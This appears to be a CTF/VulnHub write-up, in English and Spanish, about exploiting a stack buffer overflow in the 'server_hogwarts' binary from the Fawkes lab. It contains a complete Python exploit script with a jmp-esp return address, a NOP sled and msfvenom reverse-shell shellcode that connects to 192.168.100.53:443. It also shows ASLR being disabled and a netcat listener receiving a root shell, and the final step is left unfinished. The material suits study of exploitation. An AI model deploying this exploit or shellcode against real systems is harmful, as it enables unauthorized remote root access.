+heaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
+```
+and means that we have to add
+all this characters  
+
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab```daab``` to reach eip which is daab
+we can do it manually which is this way  tha t i explained before or do it automatic which is way 
+
+with gef we will ask it the value of eip 
+
+```bash
+gef➤  pattern offset $eip
+[+] Searching for '$eip'
+[+] Found at offset 112 (little-endian search) likely
+[+] Found at offset 304 (big-endian search) 
+gef➤  
+```
+so we have to add 112 characters let's verify it 
+
+with python3 we will ask for an output of 112 A's + 4 B's + 100 C's
+
+```python
+python3 -c 'print ("A"*112) + "B"*4 + "C"*100'
+```
+the c's it's because i want to know always where c's will storage 
+
+```bash
+┌─[✗]─[root@parrot]─[/home/z3kk3n]
+└──╼ #python3 -c 'print ("A"*112 + "B"*4 + "C"*100)'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+```
+let's try it 
+
+```bash
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffcd8c  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$ebx   : 0x41414141 ("AAAA"?)
+$ecx   : 0xffffd020  →  0x00000a ("\n"?)
+$edx   : 0xffffce64  →  0x00000a ("\n"?)
+$esp   : 0xffffce00  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+$ebp   : 0x41414141 ("AAAA"?)
+$esi   : 0x80b3158  →  "../csu/libc-start.c"
+$edi   : 0xffffd348  →  "\nEnter your spell: "
+$eip   : 0x42424242 ("BBBB"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffce00│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"	← $esp
+0xffffce04│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffce08│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffce0c│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffce10│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffce14│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffce18│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffce1c│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x42424242
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "server_hogwarts", stopped 0x42424242 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  
+
+```
+and it works 
+
+we are able to write on the eip register 
+because of this ```$eip   : 0x42424242 ("BBBB"?)``` 0x42 means B
+
+to check if we are able to register the ```ESP``` the stack/ we have to check here 
+with gef 
+```bash
+gef➤  x/50wx $esp
+0xffffce00:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffce10:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffce20:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffce30:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffce40:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffce50:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffce60:	0x43434343	0x0000000a	0x00000000	0x00000000
+0xffffce70:	0x00000000	0x00000000	0x00000000	0x636c6557
+0xffffce80:	0x20656d6f	0x48206f74	0x6177676f	0x73277472
+0xffffce90:	0x67616d20	0x70206369	0x6174726f	0x65540a6c
+0xffffcea0:	0x79206c6c	0x2072756f	0x6c657073	0x6e61206c
+0xffffceb0:	0x4c452064	0x20524544	0x444e4157	0x6c697720
+```
+to check the eip will be -4 where ```0x42424242``` will value B and ```0x43434343``` will value C so before ```0x43434343``` will be eip because the value of eip is ````0x42424242```
+
+```bash 
+gef➤  x/50wx $esp-4
+0xffffcdfc:	0x42424242	0x43434343	0x43434343	0x43434343
+0xffffce0c:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffce1c:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffce2c:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffce3c:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffce4c:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffce5c:	0x43434343	0x43434343	0x0000000a	0x00000000
+0xffffce6c:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffce7c:	0x636c6557	0x20656d6f	0x48206f74	0x6177676f
+0xffffce8c:	0x73277472	0x67616d20	0x70206369	0x6174726f
+0xffffce9c:	0x65540a6c	0x79206c6c	0x2072756f	0x6c657073
+0xffffceac:	0x6e61206c	0x4c452064	0x20524544	0x444e4157
+0xffffcebc:	0x6c697720	0x6570206c
+gef➤  
+```
+
+now how we know that we have to make a payload to take advange of it 
+
+in this script we will work with socket in order to send data so we have to import socket 
+
+so 
+
+```python
+import socket
+
+offset = 112
+before_eip = b"A"
+```
+offset means the eip which is 112 for that reason we will add that the value of offset is 112 in 
+
+we will work with this syntaxis ```before eip``` and during ```eip``` and ```after eip```` 
+
+
+```python
+import socket
+
+offset = 112
+before_eip = b"A" * offset
+```
+before_eip what's before eip ? A's right ? so we have to add it * offset because offset is 112 so before eip will be 112 A's 
+- b means bytes 
+- "*" means a multiplication
+- "offset" equals to 112
+
+now we have to add during eip + after eip 
+```python
+import socket
+
+offset = 112
+before_eip = b"A" * offset
+eip =
+after_eip = 
+```
+- eip 
+- after_eip we would add here our C's but we don't want to add c's we want add shellcode (shellcode means low level instructions)
+to make it possible with msfvenom we will create our shellcode
+
+```bash
+❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.53 LPORT=443 -b "\x00" -f py -v shellcode
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of py file: 550 bytes
+shellcode =  b""
+shellcode += b"\xb8\x9b\xdf\xcb\xc5\xdb\xd4\xd9\x74\x24\xf4"
+shellcode += b"\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e"
+shellcode += b"\x03\xd8\xd1\x29\x30\xef\x36\x5a\x58\x5c\x8a"
+shellcode += b"\xf6\xf5\x60\x85\x18\xb9\x02\x58\x5a\x29\x93"
+shellcode += b"\xd2\x64\x83\xa3\x5a\xe2\xe2\xcb\x9c\xbc\x71"
+shellcode += b"\x3e\x75\xbf\x79\x41\x3e\x36\x98\xf1\x26\x19"
+shellcode += b"\x0a\xa2\x15\x9a\x25\xa5\x97\x1d\x67\x4d\x46"
+shellcode += b"\x31\xfb\xe5\xfe\x62\xd4\x97\x97\xf5\xc9\x05"
+shellcode += b"\x3b\x8f\xef\x19\xb0\x42\x6f"
+```
+here's my shellcode 
+
+so instead of C in python script we will add the shellcode
+
+```
+shellcode += b"\xb8\x9b\xdf\xcb\xc5\xdb\xd4\xd9\x74\x24\xf4"
+shellcode += b"\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e"
+shellcode += b"\x03\xd8\xd1\x29\x30\xef\x36\x5a\x58\x5c\x8a"
+shellcode += b"\xf6\xf5\x60\x85\x18\xb9\x02\x58\x5a\x29\x93"
+shellcode += b"\xd2\x64\x83\xa3\x5a\xe2\xe2\xcb\x9c\xbc\x71"
+shellcode += b"\x3e\x75\xbf\x79\x41\x3e\x36\x98\xf1\x26\x19"
+shellcode += b"\x0a\xa2\x15\x9a\x25\xa5\x97\x1d\x67\x4d\x46"
+shellcode += b"\x31\xfb\xe5\xfe\x62\xd4\x97\x97\xf5\xc9\x05"
+shellcode += b"\x3b\x8f\xef\x19\xb0\x42\x6f"
+```
+add it in exploit.py
+
+```bash 
+ #/usr/bin/python3
+   2   │ 
+   3   │ import socket 
+   4   │ 
+   5   │ offset = 112
+   6   │ before_eip = b"A" * offset
+   7   │ 
+   8   │ eip = 
+   9   │ 
+  10   │ shellcode =  b""
+  11   │ shellcode += b"\xb8\x9b\xdf\xcb\xc5\xdb\xd4\xd9\x74\x24\xf4"
+  12   │ shellcode += b"\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e"
+  13   │ shellcode += b"\x03\xd8\xd1\x29\x30\xef\x36\x5a\x58\x5c\x8a"
+  14   │ shellcode += b"\xf6\xf5\x60\x85\x18\xb9\x02\x58\x5a\x29\x93"
+  15   │ shellcode += b"\xd2\x64\x83\xa3\x5a\xe2\xe2\xcb\x9c\xbc\x71"
+  16   │ shellcode += b"\x3e\x75\xbf\x79\x41\x3e\x36\x98\xf1\x26\x19"
+  17   │ shellcode += b"\x0a\xa2\x15\x9a\x25\xa5\x97\x1d\x67\x4d\x46"
+  18   │ shellcode += b"\x31\xfb\xe5\xfe\x62\xd4\x97\x97\xf5\xc9\x05"
+  19   │ shellcode += b"\x3b\x8f\xef\x19\xb0\x42\x6f"
+  20   │ 
+  21   │ 
+  22   │ before_eip = b"C"*100 # ESP
+
+```
+before eip yo se que si pongo 100 c como lo hice, van a quedar en el ESP claro si tu lograras hacer que el eip  apuntara a una direccion la cual aplique un jump ESP para que apunte al ESP  el problema de este caso es que  cuando salte al ESP  puede generar un conflicto hay veces que  no llega a clavar justo al punto donde se encuentra el shellcode por tanto la idea seria jugar con nops para crear un espacio y en tal caso la instruccion como no es precisa caiga en un punto intermeedio de los nops para luego llegarlo a desplazar donde esta nuestro shellcode
+
+entonces lo que vamos a hacer es definir nops 
+
+```bash 
+ #/usr/bin/python3
+   2   │ 
+   3   │ import socket 
+   4   │ 
+   5   │ offset = 112
+   6   │ before_eip = b"A" * offset
+   7   │ 
+   8   │ eip = 
+   9   │ 
+  10   │ shellcode =  b""
+  11   │ shellcode += b"\xb8\x9b\xdf\xcb\xc5\xdb\xd4\xd9\x74\x24\xf4"
+  12   │ shellcode += b"\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e"
+  13   │ shellcode += b"\x03\xd8\xd1\x29\x30\xef\x36\x5a\x58\x5c\x8a"
+  14   │ shellcode += b"\xf6\xf5\x60\x85\x18\xb9\x02\x58\x5a\x29\x93"
+  15   │ shellcode += b"\xd2\x64\x83\xa3\x5a\xe2\xe2\xcb\x9c\xbc\x71"
+  16   │ shellcode += b"\x3e\x75\xbf\x79\x41\x3e\x36\x98\xf1\x26\x19"
+  17   │ shellcode += b"\x0a\xa2\x15\x9a\x25\xa5\x97\x1d\x67\x4d\x46"
+  18   │ shellcode += b"\x31\xfb\xe5\xfe\x62\xd4\x97\x97\xf5\xc9\x05"
+  19   │ shellcode += b"\x3b\x8f\xef\x19\xb0\x42\x6f"
+  20   │ 
+  21   │ 
+  22   │ after_eip = b"\x90"*32 + shellcode # ESP
+
+```
+ahora como yo logro controlar el EIP tengo que buscar que el EIP apunte a una direccion donde se aplique un jump un salto al ESP para que asi a la hora de cargar esta instruccion vaya el flujo del programa al stack o sea al esp y como el esp es esto ```after_eip = b"\x90"*32 ``` para que no comience directamente con el shellcode que puede que entre en conflicto le damos un peque;o espacio  ```after_eip = b"\x90"*32 ``` para caer en un punto intermediario de los nops  y ya que esto nos mande al shellcode
+
+ahora nuestro objetivo es buscar donde se aplique esta instruccion el jmp ESP 
+
+para buscarla usaremos una tool que se llama objdump + -D + binario + | + grep + opcode
+
+
+y con metasploit usamos namshell para buscar un operation code y tomar este operation code y filtrarlo 
+
+
+ejm
+
+```bash 
+busquemos el operation code del jmp con metasploit 
+❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > jmp ESP
+00000000  FFE4              jmp esp
+nasm > 
+```
+el operation code seria ```ffe4``` cuando lo vayamos a grepear hay que poner minusculas 
+
+ejm 
+```bash 
+#objdump -D server_hogwarts | grep "ff e4"
+ 8049d55:	ff e4                	jmp    *%esp
+ 80b322c:	81 73 f6 ff e4 73 f6 	xorl   $0xf673e4ff,-0xa(%ebx)
+ 80b3253:	ff 91 73 f6 ff e4    	call   *-0x1b00098d(%ecx)
+ 80b500f:	ff e4                	jmp    *%esp
+ 80b51ef:	ff e4                	jmp    *%esp
+ 80b546f:	ff e4                	jmp    *%esp
+ 80d0717:	ff e4                	jmp    *%esp
+
+```
+and this is the direction because of ```ff e4``` > ```8049d55``` this one right ```8049d55``` 
+
+
+si ahora yo lograra que el eip apuntara a esta direccion ```8049d55 ``` se deberia de aplicar un salto al esp 
+
+como estamos en 32 bits tenemos que jugar con la direccion al reves seria copiar la direccion ```8049d55``` y ponerla alrevez ejem 
+
+eip = ```bash"x55/x9d/x04/x08"``` # ```8049d55``` ->jmp ESP
+
+the script will be like this 
+
+```bash
+#/usr/bin/python3
+
+import socket 
+
+offset = 112
+before_eip = b"A" * offset
+
+eip = b"\x55\x9d\x04\x08" # 8049s55 jmp ESP
+
+shellcode =  b""
+shellcode += b"\xb8\x9b\xdf\xcb\xc5\xdb\xd4\xd9\x74\x24\xf4"
+shellcode += b"\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x43\x0e"
+shellcode += b"\x03\xd8\xd1\x29\x30\xef\x36\x5a\x58\x5c\x8a"
+shellcode += b"\xf6\xf5\x60\x85\x18\xb9\x02\x58\x5a\x29\x93"
+shellcode += b"\xd2\x64\x83\xa3\x5a\xe2\xe2\xcb\x9c\xbc\x71"
+shellcode += b"\x3e\x75\xbf\x79\x41\x3e\x36\x98\xf1\x26\x19"
+shellcode += b"\x0a\xa2\x15\x9a\x25\xa5\x97\x1d\x67\x4d\x46"
+shellcode += b"\x31\xfb\xe5\xfe\x62\xd4\x97\x97\xf5\xc9\x05"
+shellcode += b"\x3b\x8f\xef\x19\xb0\x42\x6f"
+
+
+after_eip = b"\x90"*32 + shellcode # ESP
+
+payload = before_eip + eip + after_eip
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect (("127.0.0.1", 9898))
+s.send(payload)
+s.close()
+
+```
+let's try in our machine 
+
+before you run this app please make sure to change this 
+
+```bash
+❯ cat /proc/sys/kernel/randomize_va_space
+───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: /proc/sys/kernel/randomize_va_space
+───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 2
+───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯ vi /proc/sys/kernel/randomize_va_space
+❯ vi /proc/sys/kernel/randomize_va_space
+❯ cat /proc/sys/kernel/randomize_va_space
+───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: /proc/sys/kernel/randomize_va_space
+───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 0
+───────┴─────────────────────────────────────
+```
+2 to 0 to make sure that the program works 
+cat proc/sys/kernel/randomize_va_space it has to day 0
+
+
+just run tt 
+
+❯ ./server_hogwarts
+
+----------------------
+
+┌─[root@parrot]─[/home/z3kk3n/Desktop/vulnHUB/fawkes/exploits]
+└──╼ #python3 exploit.py 
+
+from another terminal open your conection with nc 
+
+```bash 
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [192.168.100.53] from (UNKNOWN) [192.168.100.53] 41302
+wjoami
+//bin/sh: 1: wjoami: not found
+whoami
+root
+
+```
+so it works let's adapt it to explote fawkes 
+
+a few changes 
+
+we have to change the shell code and where we want to connect before we aim to our localHost
+
+
+
+
+
+
+before you run your exploit.py make sure you specify where they have to go for that reason we import socket 
+
+ejm
+
+```bash
+
+
+
+```
+
+
+
+
 
 
 Happy hacking !
